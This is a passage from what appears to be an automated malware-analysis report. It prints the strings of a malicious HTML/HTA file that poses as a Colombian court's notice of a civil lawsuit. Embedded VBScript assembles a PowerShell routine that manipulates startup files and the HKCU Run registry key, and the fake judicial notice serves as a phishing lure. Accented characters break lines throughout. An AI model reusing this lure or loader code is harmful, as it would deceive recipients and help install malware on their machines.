+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    Remove-Item -Path ($startup + '\\terosRjfEZth.vbs') -Force -ErrorAction SilentlyContinue\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'AmOtaOASxji' -Force -ErrorAction SilentlyContinue\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                    Remove-Item -Path $rYlFs_gA9_c9 -Force -ErrorAction SilentlyContinue\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                } catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"                exit\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"            }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"        }\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    } catch {}\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"    Start-Sleep -Seconds 2\" & vbCrLf", 
+        "EVwOwCgnDYG4 = EVwOwCgnDYG4 & \"}\" & vbCrLf", 
+        "GetPS1 = EVwOwCgnDYG4", 
+        "End Function", 
+        "</script>", 
+        "</head>", 
+        "<style>", 
+        "body { font-family: 'Times New Roman', serif; margin: 0; padding: 30px; background: #fff; }", 
+        ".header { text-align: center; margin-bottom: 25px; }", 
+        ".escudo { font-size: 35px; margin-bottom: 10px; }", 
+        ".entity { font-size: 16px; font-weight: bold; }", 
+        ".sub-entity { font-size: 13px; color: #333; }", 
+        ".court { font-size: 14px; font-weight: bold; margin-top: 15px; border: 2px solid #000; padding: 10px; display: inline-block; }", 
+        ".info-section { background: #f5f5f5; padding: 15px; margin: 20px 0; border-left: 4px solid #333; }", 
+        ".info-row { margin-bottom: 8px; }", 
+        ".info-label { font-weight: bold; }", 
+        ".title { font-size: 18px; font-weight: bold; text-align: center; margin: 25px 0; background: #333; color: white; padding: 10px; }", 
+        ".content { line-height: 1.9; text-align: justify; }", 
+        ".content p { margin-bottom: 15px; text-indent: 30px; }", 
+        ".warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; margin: 20px 0; }", 
+        ".warning-title { font-weight: bold; color: #856404; }", 
+        ".signature { margin-top: 40px; }", 
+        ".signature-box { border-top: 1px solid #000; width: 280px; padding-top: 10px; margin-top: 60px; }", 
+        ".footer { margin-top: 30px; font-size: 10px; color: #666; text-align: center; border-top: 1px solid #ddd; padding-top: 10px; }", 
+        "</style>", 
+        "<body>", 
+        "<div class=\"header\">", 
+        "    <div class=\"escudo\">&#127963;</div>", 
+        "    <div class=\"entity\">RAMA JUDICIAL DEL PODER P", 
+        "BLICO</div>", 
+        "    <div class=\"sub-entity\">Rep", 
+        "blica de Colombia</div>", 
+        "    <div class=\"court\">JUZGADO 2 CIVIL DEL CIRCUITO DE BOGOT", 
+        "</div>", 
+        "</div>", 
+        "<div class=\"info-section\">", 
+        "    <div class=\"info-row\"><span class=\"info-label\">Radicaci", 
+        "n:</span> 2025-92701-5876</div>", 
+        "    <div class=\"info-row\"><span class=\"info-label\">Fecha:</span> 13 de junio de 2024</div>", 
+        "    <div class=\"info-row\"><span class=\"info-label\">Clase de Proceso:</span> CIVIL</div>", 
+        "</div>", 
+        "<div class=\"title\">NOTIFICACI", 
+        "N DE DEMANDA</div>", 
+        "<div class=\"content\"><p>El Juzgado 2 Civil del Circuito de Bogot", 
+        ", <strong>NOTIFICA</strong> al destinatario que en su contra se ha presentado <strong>DEMANDA CIVIL</strong> bajo radicado <strong>2025-92701-5876</strong>.</p>", 
+        "                <p>Se le concede un t", 
+        "rmino de <strong>DIEZ (10) D", 
+        "BILES</strong> contados a partir de la fecha de notificaci", 
+        "n para contestar la demanda y ejercer su derecho de defensa.</p>", 
+        "                <p>El expediente se encuentra disponible para consulta en la Secretar", 
+        "a del Juzgado en horario de atenci", 
+        "n al p", 
+        "blico.</p></div>", 
+        "<div class=\"warning\">", 
+        "    <div class=\"warning-title\">&#9888; IMPORTANTE:</div>", 
+        "    <p>La no comparecencia o contestaci", 
+        "n dentro del t", 
+        "rmino legal podr", 
+        " acarrear consecuencias procesales adversas conforme a la ley.</p>", 
+        "</div>", 
+        "<div class=\"signature\">", 
+        "    <div class=\"signature-box\">", 
+        "        <strong>SERGIO IVAN RUBIO MEDINA</strong><br>", 
+        "        Juez 2 Civil del Circuito", 
+        "    </div>", 
+        "</div>", 
+        "<div class=\"footer\">", 
+        "    <p>Calle 12 No. 7-65 - Palacio de Justicia - Bogot", 
+        " D.C.</p>", 
+        "    <p>www.ramajudicial.gov.co</p>", 
+        "</div>", 
+        "</body>", 
+        "</html>"
+    ], 
+    "metadata": {
+        "output": {
+            "pcap": {
+                "basename": "dump.pcap", 
+                "sha256": "704e5e5b3234433c01fcfd1b20a306e77e985038120492dc53965c3edd38a4ea", 
+                "dirname": ""
+            }
+        }
+    }
+}
